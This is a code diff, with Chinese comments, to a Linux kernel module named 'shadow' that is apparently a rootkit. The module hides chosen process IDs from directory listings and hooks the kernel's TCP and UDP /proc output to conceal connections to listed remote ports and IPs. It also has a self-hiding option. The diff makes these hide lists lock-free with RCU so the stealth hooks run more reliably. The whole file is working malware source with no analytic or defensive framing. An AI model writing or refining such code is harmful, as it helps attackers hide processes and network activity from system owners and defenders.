@@ -15,6 +15,7 @@
 #include <linux/string.h>
 #include <linux/ctype.h>
 #include <linux/seq_file.h>
+#include <linux/rculist.h>
 #include <net/tcp.h>
 #include <net/udp.h>
 
@@ -22,7 +23,6 @@
 
 /* 定义递归保护变量 */
 DEFINE_PER_CPU(int, shadow_recursion_guard) = 0;
-EXPORT_PER_CPU_SYMBOL(shadow_recursion_guard);
 
 /* 模块参数 */
 static int self_hide = 0;
@@ -38,6 +38,7 @@ module_param(self_hide, int, 0644);
 struct hide_item {
     struct list_head list;
     unsigned int value;
+    struct rcu_head rcu;
 };
 
 static LIST_HEAD(hide_pids);
@@ -45,10 +46,14 @@ static LIST_HEAD(hide_remote_ports);
 static LIST_HEAD(hide_remote_ips);
 static DEFINE_SPINLOCK(hide_lock);
 
-/* 辅助函数：管理隐藏列表 */
+/* 
+ * 核心优化：RCU 管理隐藏列表
+ * 写入时加锁，读取时完全无锁
+ */
 static void add_to_list(struct list_head *head, unsigned int value) {
     struct hide_item *item;
     unsigned long flags;
+
     spin_lock_irqsave(&hide_lock, flags);
     list_for_each_entry(item, head, list) {
         if (item->value == value) {
@@ -59,7 +64,7 @@ static void add_to_list(struct list_head *head, unsigned int value) {
     item = kmalloc(sizeof(*item), GFP_ATOMIC);
     if (item) {
         item->value = value;
-        list_add(&item->list, head);
+        list_add_rcu(&item->list, head);
     }
     spin_unlock_irqrestore(&hide_lock, flags);
 }
@@ -67,28 +72,32 @@ static void add_to_list(struct list_head *head, unsigned int value) {
 static void del_from_list(struct list_head *head, unsigned int value) {
     struct hide_item *item, *tmp;
     unsigned long flags;
+
     spin_lock_irqsave(&hide_lock, flags);
     list_for_each_entry_safe(item, tmp, head, list) {
         if (item->value == value) {
-            list_del(&item->list);
-            kfree(item);
+            list_del_rcu(&item->list);
+            kfree_rcu(item, rcu);
         }
     }
     spin_unlock_irqrestore(&hide_lock, flags);
 }
 
-static bool is_in_list(struct list_head *head, unsigned int value) {
+/* 
+ * RCU 无锁查询：彻底解决 soft lockup 的关键
+ */
+static bool is_in_list_rcu(struct list_head *head, unsigned int value) {
     struct hide_item *item;
     bool found = false;
-    unsigned long flags;
-    spin_lock_irqsave(&hide_lock, flags);
-    list_for_each_entry(item, head, list) {
+
+    rcu_read_lock();
+    list_for_each_entry_rcu(item, head, list) {
         if (item->value == value) {
             found = true;
             break;
         }
     }
-    spin_unlock_irqrestore(&hide_lock, flags);
+    rcu_read_unlock();
     return found;
 }
 
@@ -112,7 +121,7 @@ static int stealth_actor(struct dir_context *ctx, const char *name, int len,
 
     if (len > 0 && isdigit(name[0])) {
         if (kstrtouint(name, 10, &pid) == 0) {
-            if (is_in_list(&hide_pids, pid)) {
+            if (is_in_list_rcu(&hide_pids, pid)) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
                 return true;
 #else
@@ -164,11 +173,6 @@ static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
 static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*real_udp4_seq_show)(struct seq_file *seq, void *v);
 
-/* 
- * 核心修复：
- * 1. 使用 shadow_enter_atomic() 彻底杜绝递归
- * 2. 严格校验 v 指针
- */
 static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
@@ -176,14 +180,13 @@ static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
 
     if (!real_tcp4_seq_show) return -ENOSYS;
 
-    /* 递归保护：如果已经在钩子中，直接调用原始函数并返回 */
     if (!shadow_enter_atomic()) {
         return real_tcp4_seq_show(seq, v);
     }
 
     if (v != SEQ_START_TOKEN && sk) {
-        if (is_in_list(&hide_remote_ports, ntohs(sk->sk_dport)) ||
-            is_in_list(&hide_remote_ips, sk->sk_daddr)) {
+        if (is_in_list_rcu(&hide_remote_ports, ntohs(sk->sk_dport)) ||
+            is_in_list_rcu(&hide_remote_ips, sk->sk_daddr)) {
             ret = 0;
             goto out;
         }
@@ -208,8 +211,8 @@ static int fake_udp4_seq_show(struct seq_file *seq, void *v)
     }
 
     if (v != SEQ_START_TOKEN && sk) {
-        if (is_in_list(&hide_remote_ports, ntohs(sk->sk_dport)) ||
-            is_in_list(&hide_remote_ips, sk->sk_daddr)) {
+        if (is_in_list_rcu(&hide_remote_ports, ntohs(sk->sk_dport)) ||
+            is_in_list_rcu(&hide_remote_ips, sk->sk_daddr)) {
             ret = 0;
             goto out;
         }
@@ -342,11 +345,18 @@ static void __exit shadow_exit(void)
         }
     }
     
+    /* 
+     * 退出时清理：
+     * 必须先从列表中移除，然后等待 RCU 宽限期
+     */
     spin_lock_irqsave(&hide_lock, flags);
-    list_for_each_entry_safe(item, tmp, &hide_pids, list) { list_del(&item->list); kfree(item); }
-    list_for_each_entry_safe(item, tmp, &hide_remote_ports, list) { list_del(&item->list); kfree(item); }
-    list_for_each_entry_safe(item, tmp, &hide_remote_ips, list) { list_del(&item->list); kfree(item); }
+    list_for_each_entry_safe(item, tmp, &hide_pids, list) { list_del_rcu(&item->list); kfree_rcu(item, rcu); }
+    list_for_each_entry_safe(item, tmp, &hide_remote_ports, list) { list_del_rcu(&item->list); kfree_rcu(item, rcu); }
+    list_for_each_entry_safe(item, tmp, &hide_remote_ips, list) { list_del_rcu(&item->list); kfree_rcu(item, rcu); }
     spin_unlock_irqrestore(&hide_lock, flags);
+
+    /* 等待所有 RCU 回调完成 */
+    rcu_barrier();
 
     pr_info("shadow: Module unloaded\n");
 }
@@ -355,4 +365,4 @@ module_init(shadow_init);
 module_exit(shadow_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("GPL");
-MODULE_DESCRIPTION("Linux LKM Kernel shadow service");
+MODULE_DESCRIPTION("Linux LKM Kernel shadow service v20.4-stable-rcu");
